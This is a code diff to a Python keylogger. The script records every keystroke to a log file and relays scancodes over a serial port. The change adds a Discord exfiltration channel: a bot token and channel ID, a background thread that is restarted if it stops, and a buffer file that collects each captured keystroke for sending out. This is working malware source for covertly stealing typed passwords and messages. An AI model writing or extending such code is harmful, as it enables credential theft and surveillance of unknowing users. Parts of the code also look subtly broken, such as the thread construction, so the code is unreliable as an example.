@@ -7,7 +7,8 @@ import os
 import keyboard as k
 import datetime
 import serial
-
+import send_discord
+from send_discord import ENABLE_DISCORD_LOGGING , YOUR_CHANNEL_ID, YOUR_TOKEN , buffer_path
 SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
 NULL_CHAR = chr(0)
 
@@ -15,11 +16,17 @@ path_log = f"{SCRIPT_PATH}/Log.txt"
 serial_port = r'/dev/ttyS0'
 
 ser = serial.Serial(serial_port, baudrate=9600, timeout=1)
-
 shift_pressed = False
+
+discord_thread = None
+if ENABLE_DISCORD_LOGGING:
+    discord_thread = threading.Thread(send_discord.run_bot)
+    discord_thread.daemon = True
+    discord_thread.start()
 def on_key_event(e):
     global shift_pressed
-
+    if ENABLE_DISCORD_LOGGING and not discord_thread.is_alive():
+        restart_discord_thread()
     pressed_events = k._pressed_events
     print(pressed_events)
     scancodes = [str(scancode_to_packet[event]) for event in pressed_events if pressed_events[event].event_type=="down"]
@@ -29,8 +36,7 @@ def on_key_event(e):
             shift_pressed = True
         elif shift_pressed:
             shift_pressed = False
-            with open(path_log, "a") as log:
-                log.write("(RShift)")
+            log("(RShift)")
         if scancodes:
             ser.write((",".join(scancodes)+",\n").encode("utf-8"))
 
@@ -43,18 +49,28 @@ def on_key_event(e):
     if e.event_type == k.KEY_DOWN:
 
 
-        with open(path_log, "a") as log:
-            try:
-                if len(e.name) > 1 and e.name != "space":
-                    log.write(f"({e.name})")
-                elif e.name == "space":
-                    log.write(" ")
-                else:
-                    log.write(e.name)
+        
+        try:
+            if len(e.name) > 1 and e.name != "space":
+                log(f"({e.name})")
+            elif e.name == "space":
+                log(" ")
+            else:
+                log(e.name)
 
-            except Exception as ex:
-                print(f"Error writing event to log: {str(ex)}")
-
+        except Exception as ex:
+            print(f"Error writing event to log: {str(ex)}")
+def log(message:str):
+    with open(path_log, "a") as log:
+        log.write(message)
+    if ENABLE_DISCORD_LOGGING:
+        with open(buffer_path,"a") as discord_log:
+            discord_log.write(message)
+def restart_discord_thread():
+    global discord_thread
+    discord_thread = threading.Thread(send_discord.run_bot)
+    discord_thread.daemon = True
+    discord_thread.start()
 
 
 def setup():
